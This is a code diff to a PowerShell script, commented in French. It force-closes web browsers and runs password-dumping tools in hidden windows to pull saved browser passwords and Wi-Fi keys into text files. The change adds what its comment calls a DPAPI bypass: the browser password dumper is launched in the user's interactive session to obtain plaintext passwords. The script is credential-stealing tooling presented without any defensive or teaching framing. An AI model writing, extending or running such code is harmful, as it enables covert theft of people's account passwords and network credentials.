@@ -24,14 +24,25 @@ try {
     exit 1
 }
 
-# Fermeture des navigateurs pour déverrouiller l'accès aux bases de données chiffrées (fichiers Login Data)
+# Fermeture des navigateurs pour déverrouiller l'accès aux bases de données chiffrées
 Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 2
 
-# Exécution des outils de dump avec chemins absolus
-if (Test-Path "$basePath\WebBrowserPassView.exe") {
+# --- CONTOURNEMENT DPAPI : Exécution interactive pour récupérer les mots de passe en clair ---
+$explorer = Get-Process -IncludeUserName | Where-Object {$_.ProcessName -eq "explorer"} | Select-Object -First 1
+
+if ($explorer) {
+    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
+    $processInfo.FileName = "$basePath\WebBrowserPassView.exe"
+    $processInfo.Arguments = "/stext $basePath\passwords.txt"
+    $processInfo.UseShellExecute = $true
+    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
+    Start-Sleep -Seconds 4
+} else {
     Start-Process -FilePath "$basePath\WebBrowserPassView.exe" -ArgumentList "/stext $basePath\passwords.txt" -Wait -WindowStyle Hidden
 }
+
+# Exécution des autres outils avec chemins absolus
 if (Test-Path "$basePath\WirelessKeyView.exe") {
     Start-Process -FilePath "$basePath\WirelessKeyView.exe" -ArgumentList "/stext $basePath\wifi.txt" -Wait -WindowStyle Hidden
 }
